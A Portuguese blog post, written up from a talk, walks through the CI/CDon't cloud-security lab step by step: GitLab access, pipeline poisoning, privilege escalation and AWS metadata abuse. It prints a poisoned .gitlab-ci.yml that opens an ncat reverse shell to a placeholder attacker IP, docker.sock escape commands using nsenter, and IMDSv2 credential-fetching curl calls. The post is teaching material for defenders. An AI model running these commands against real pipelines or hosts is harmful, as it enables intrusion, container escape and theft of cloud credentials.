---
title: "<span>CI/CDon’t</span>: Um Lab sobre Invasão de Pipelines"
date: 2025-04-10
description: "Explorando falhas em pipelines CI/CD usando GitLab e AWS com o laboratório Ci/CDont do Hacking the Cloud"
tags: ["security", "devsecops", "pipeline", "aws", "gitlab", "hacking"]
categories: ["segurança", "cloud"]
slug: "cicdont"
author: "Fernando Guisso"
---

Como um simples `.gitlab-ci.yml` pode comprometer toda a sua infraestrutura na AWS?

Neste artigo, vou compartilhar uma palestra que apresentei sobre o lab **[Ci/CDont](https://hackingthe.cloud/aws/capture_the_flag/cicdont/)** — um laboratório criado para demonstrar, de forma prática, como **pipelines CI/CD mal configuradas** podem se transformar em verdadeiras portas de entrada para invasores.

---

## Outros Labs que Você Pode Explorar

Se você curte labs hands-on de segurança em nuvem, recomendo essas plataformas:

- [AWSGoat](https://github.com/ine-labs/AWSGoat)  
- [GCPGoat](https://github.com/ine-labs/GCPGoat)  
- [AzureGoat](https://github.com/ine-labs/AzureGoat)  
- [Kubernetes Goat](https://madhuakula.com/kubernetes-goat/)  
- [CICDGoat](https://github.com/cider-security-research/cicd-goat)  
- [IAM Vulnerable](https://github.com/BishopFox/iam-vulnerable)  
- [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat)  
- [Hacking The Cloud Labs](https://hackingthe.cloud)

## Por que o CI/CDon’t?

Esse lab nos ajuda a:

- Entender como pipelines podem ser exploradas por atacantes reais  
- Simular ataques usando GitLab + AWS  
- Desenvolver o olhar defensivo com base em exploração real  
- Praticar sozinho ou em grupo com poucos recursos

## Etapa 1 — Acesso ao GitLab

O atacante pode iniciar o ataque por:

- Registro aberto no GitLab com acesso a repositórios e jobs
- Comprometimento de contas por:
  - Senhas fracas
  - [Password Spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack)
  - [Phishing](https://pt.wikipedia.org/wiki/Phishing), mesmo com MFA ativo

**Dica**: Segurança do usuário importa — sempre.

## Etapa 2 — Pipeline Poisoning

Com acesso ao repositório, o atacante modifica o `.gitlab-ci.yml` para injetar código malicioso.

```yaml
build-job:
  stage: build
  script:
    - apt update
    - apt install -y ncat
    - ncat <ip_do_atacante> --ssl -e /bin/bash -v
```

Esse ataque permite executar um **reverse shell** e obter acesso direto ao runner da pipeline.

Saiba mais: [GitLab CI/CD Pipelines](https://docs.gitlab.com/ee/ci/)

## Etapa 3 — Escalada de Privilégios

Com acesso ao runner, o atacante:

- Busca scripts rodando como root
- Abusa de permissões mal configuradas
- Enxerga recursos internos da rede
- E às vezes... encontra o **docker.sock**

## Etapa 4 — Docker Socket e Escapando do Container

Se o `docker.sock` estiver acessível no container, o atacante pode escapar facilmente:

```bash
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

🔥 Isso dá acesso ao host com permissões do processo `PID 1`.

## Etapa 5 — Explorando o IMDS

O [IMDS (Instance Metadata Service)](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) fornece dados da instância, incluindo **credenciais temporárias IAM**.

```bash
# IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data/
```

Com isso, o atacante pode acessar outros recursos na AWS como se fosse a própria instância.

## Lições Aprendidas

- CI/CD é infraestrutura crítica — trate como tal
- Proteja:
  - Acesso ao GitLab ([GitLab Hardening Guide](https://about.gitlab.com/security/hardening/))
  - Configuração dos runners ([Runner Security](https://docs.gitlab.com/runner/security/))
  - Permissões das instâncias e roles IAM
  - Logs, artefatos e variáveis sensíveis
